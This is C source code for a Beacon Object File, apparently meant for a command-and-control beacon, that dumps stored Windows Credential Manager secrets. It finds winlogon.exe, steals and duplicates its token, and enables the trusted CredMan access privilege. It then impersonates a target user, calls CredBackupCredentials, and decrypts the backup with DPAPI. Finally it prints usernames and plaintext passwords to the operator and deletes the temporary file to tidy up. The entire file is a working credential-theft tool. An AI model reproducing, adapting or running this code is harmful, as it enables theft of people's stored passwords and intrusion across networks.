#include "CredMan.h"
#include <dpapi.h>
#include <tlhelp32.h>
#include "beacon.h"
#define MAX_LENGTH 256
#define MAX_PATH 260

WINBASEAPI WINBOOL WINAPI KERNEL32$FileTimeToSystemTime(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, WINBOOL, DWORD);
WINADVAPI WINBOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI WINBOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
WINADVAPI WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, WINBOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI WINBOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);
WINBASEAPI WINBOOL WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI UINT WINAPI KERNEL32$GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINIMPM WINBOOL WINAPI CRYPT32$CryptUnprotectData(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *);
WINADVAPI WINBOOL WINAPI ADVAPI32$CredBackupCredentials(HANDLE, LPCWSTR, PVOID, DWORD, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();
WINADVAPI WINBOOL WINAPI ADVAPI32$RevertToSelf();
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1, const char *_Str2);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf_s(wchar_t *, size_t, const wchar_t *, char *);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memcpy(void *__restrict__ _Dst, const void *__restrict__ _Src, size_t _MaxCount);

void UnpackData(PCRED_BLOB cred_blob)
{
    PCRED_BLOB orig_cred_blob = cred_blob;
    wchar_t *username = NULL;
    CHAR *password = NULL;
    wchar_t *targetName = NULL;
    wchar_t *targetAlias = NULL;
    wchar_t *comment = NULL;
    DWORD usernameLen = 0;
    DWORD credsDataLen = 0;
    DWORD commentLen = 0;
    DWORD targetNameLen = 0;
    SYSTEMTIME utc;
    datap parser;

    int offset = 44; // start at dwTargetName
    KERNEL32$FileTimeToSystemTime(&cred_blob->LastWritten, &utc);
    BeaconDataParse(&parser, (char *)(((void *)cred_blob) + offset), cred_blob->credSize - offset);

    targetName = (wchar_t *)BeaconDataExtract(&parser, NULL);
    targetAlias = (wchar_t *)BeaconDataExtract(&parser, NULL);
    comment = (wchar_t *)BeaconDataExtract(&parser, NULL);
    BeaconDataExtract(&parser, NULL); // unknown data
    username = (wchar_t *)BeaconDataExtract(&parser, NULL);
    credsDataLen = BeaconDataInt(&parser);
    if (credsDataLen > 0)
    {
        password = KERNEL32$GlobalAlloc(GPTR, (SIZE_T)credsDataLen);
        MSVCRT$memcpy(password, parser.buffer, credsDataLen);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Type:%-100s\n", CredType[cred_blob->Type]);
    BeaconPrintf(CALLBACK_OUTPUT, "Last written: %02d/%02d/%04d - %02d:%d:%d\n", utc.wMonth, utc.wDay, utc.wYear, utc.wHour, utc.wMinute, utc.wSecond);
    BeaconPrintf(CALLBACK_OUTPUT, "Persist: %-100s\n", CredentialPersistence[cred_blob->persist]);
    BeaconPrintf(CALLBACK_OUTPUT, "Username: %-100S\n", username);
    BeaconPrintf(CALLBACK_OUTPUT, "Password: %-100S\n", password);
    BeaconPrintf(CALLBACK_OUTPUT, "Comment: %-100S\n", comment);
    BeaconPrintf(CALLBACK_OUTPUT, "Target name: %-100S\n", targetName);
    KERNEL32$GlobalFree(password);
}

DWORD FindWinLogonPid()
{

    HANDLE hSnapShot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {0};
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (hSnapShot)
    {

        if (KERNEL32$Process32First(hSnapShot, &pe))
        {
            do
            {
                if (MSVCRT$strcmp(pe.szExeFile, "winlogon.exe") == 0)
                {
                    return pe.th32ProcessID;
                }

            } while (KERNEL32$Process32Next(hSnapShot, &pe));
            KERNEL32$CloseHandle(hSnapShot);
        }
    }
}

void go(char *args, int len)
{

    // Not implemented in our loader yet
    // if (!BeaconIsAdmin())
    // {
    //     BeaconPrintf(CALLBACK_ERROR, "You must be a admin for this to work");
    //     return;
    // }
    datap parser;
    BeaconDataParse(&parser, args, len);
    int userpid;
    int dataRead = 0;
    HANDLE hProc = NULL;
    HANDLE hToken = NULL;
    HANDLE userToken = NULL;
    HANDLE impToken = NULL;
    HANDLE userProc = NULL;
    HANDLE hFile = NULL;
    PCRED_BACKUP backupData;
    CHAR *backupFile = NULL;
    wchar_t *dumpfilepath;
    WCHAR szTempFileName[MAX_PATH];
    WCHAR lpTempPathBuffer[MAX_PATH];
    DWORD backupStatus = 0;

    userpid = BeaconDataInt(&parser);

    DWORD PID = FindWinLogonPid();
    hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID);
    if (hProc == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "KERNEL32$OpenProcess failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    DWORD status = ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    status = ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &impToken);
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    TOKEN_PRIVILEGES tp = {0};
    LUID luid = {0};

    status = ADVAPI32$LookupPrivilegeValueA(NULL, "SeTrustedCredManAccessPrivilege", &luid);
    if (status == 0)
    {

        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
        ;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    status = ADVAPI32$AdjustTokenPrivileges(impToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    userProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, userpid);
    if (userProc == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "KERNEL32$OpenProcess Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    status = ADVAPI32$OpenProcessToken(userProc, TOKEN_ALL_ACCESS, &userToken);
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "KERNEL32$OpenProcessToken Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    status = ADVAPI32$ImpersonateLoggedOnUser(impToken);
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedonUser Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    DWORD dwRetval = KERNEL32$GetTempPathW(MAX_PATH, lpTempPathBuffer);
    if (dwRetval > MAX_PATH || (dwRetval == 0))
    {
        BeaconPrintf(CALLBACK_ERROR, "GetTempPathA failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    DWORD uRetval = KERNEL32$GetTempFileNameW(lpTempPathBuffer, L"bkp", 0, szTempFileName);
    if (uRetval == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetTempFileNameA failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    backupStatus = ADVAPI32$CredBackupCredentials(userToken, (LPCWSTR)szTempFileName, NULL, 0, 0);
    if (backupStatus == FALSE)
    {
        BeaconPrintf(CALLBACK_ERROR, "ADVAPI32$CredBackupCredentials Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    hFile = KERNEL32$CreateFileW((LPCWSTR)szTempFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }
    DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        BeaconPrintf(CALLBACK_ERROR, "KERNEL32$GetFileSize Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }
    backupFile = KERNEL32$GlobalAlloc(GPTR, (SIZE_T)dwFileSize);
    DWORD dwRead = 0;
    KERNEL32$ReadFile(hFile, backupFile, dwFileSize, &dwRead, NULL);
    if (dwRead == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "KERNEL32$ReadFile Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }
    DATA_BLOB creds = {0};
    creds.cbData = dwFileSize;
    creds.pbData = (BYTE *)backupFile;

    DATA_BLOB verify = {0};
    status = CRYPT32$CryptUnprotectData(&creds, NULL, NULL, NULL, NULL, 0, &verify);
    if (status == FALSE)
    {
        BeaconPrintf(CALLBACK_ERROR, "CRYPT32$CryptUnprotectData Failed with error code %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    status = ADVAPI32$RevertToSelf();
    if (status == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "RevertToSelf failed %d\n", KERNEL32$GetLastError());
        goto cleanup;
    }

    backupData = (PCRED_BACKUP)verify.pbData;
    if (backupData->file_size > 0)
    {
        CRED_BLOB *blob = &backupData->blobs;
        while (dataRead < backupData->file_size)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "\n------------------------------\n");
            UnpackData((PCRED_BLOB)blob);
            // Increment dataRead
            if (dataRead + blob->credSize <= backupData->file_size)
            {
                dataRead += blob->credSize;
                blob = (CRED_BLOB *)((void *)blob + blob->credSize);
            }
            else
            {
                break;
            }
        }
    }
    goto cleanup;

cleanup:
    if (hProc)
    {
        KERNEL32$CloseHandle(hProc);
    }
    if (hToken)
    {
        KERNEL32$CloseHandle(hToken);
    }
    if (impToken)
    {
        KERNEL32$CloseHandle(impToken);
    }
    if (userProc)
    {
        KERNEL32$CloseHandle(userProc);
    }
    if (userToken)
    {
        KERNEL32$CloseHandle(userToken);
    }
    if (hFile)
    {
        KERNEL32$CloseHandle(hFile);
    }
    if (backupFile)
    {
        KERNEL32$GlobalFree(backupFile);
    }
    if (backupStatus != 0)
    {
        if (KERNEL32$DeleteFileW((LPCWSTR)szTempFileName) == 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "DeleteFileW failed with error %d", KERNEL32$GetLastError());
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "\n\nCleaned up temporary file %S\n", (LPCWSTR)szTempFileName);
        }
    }
}
